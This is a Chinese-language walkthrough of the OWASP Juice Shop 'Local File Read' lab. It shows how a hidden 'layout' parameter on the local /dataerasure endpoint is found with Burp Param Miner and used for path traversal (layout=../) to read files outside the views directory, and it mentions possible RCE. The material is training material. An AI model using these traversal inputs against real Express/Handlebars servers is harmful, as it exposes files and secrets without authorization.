---
title: Local File Read
description: 对参数进行测试，发现文件读取漏洞
---

- 描述：获取对 Web 服务器上任意本地文件的读取访问权限。
- 查看示例解决方案
- 定位删除用户信息功能
    ```http://127.0.0.1:3000/dataerasure```
-  基准请求
    ```
    POST /dataerasure HTTP/1.1

    email=foo%40bar&securityAnswer=fooo
    ```
- 使用 Burp 插件 Param Miner 进行参数探测
    ```
    Identified parameter on 127.0.0.1: settings
    Identified parameter on 127.0.0.1: layout
    ```

- 添加参数 ```settings``` 但效果未知，显示有关路径参数
    向量 
    ```email=foo%40bar&securityAnswer=fooo&settings=test```
    响应
    ```TypeError [ERR_INVALID_ARG_TYPE]: The "path" argument must be of type string. Received undefined```

- 添加参数 ```layout``` 显示注入点在文件路径中，且使用 open 方法
    向量
    ```email=foo%40bar&securityAnswer=fooo&layout=test```
    响应
    ```Error: ENOENT: no such file or directory, open '/juice-shop/views/test.hbs'```

- 定位路径注入点
    ```'/juice-shop/views/注入点.hbs'```
    - 测试 ```layout=test.md```
    响应
    ```Error: ENOENT: no such file or directory, open '/juice-shop/views/test.md'```
    - 当 layout 参数无扩展名时自动添加 ```.hbs``` 后缀，若附有拥有后缀则不添加。
- 重新定位注入点
    ```'/juice-shop/views/注入点'```
    - ```layout=../``` 对应 ```/juice-shop/注入点```
    - ```layout=../``` 对应 ```/注入点```

> 这种漏洞出现在 ExpressJS 使用 Handlebars 作为模板引擎时，甚至在某些情况下会导致远程代码执行（RCE）。你可以在 Juice Shop 前 Google Summer of Code 学生 Shoeb Patel 的这篇博客中了解更多信息。
https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/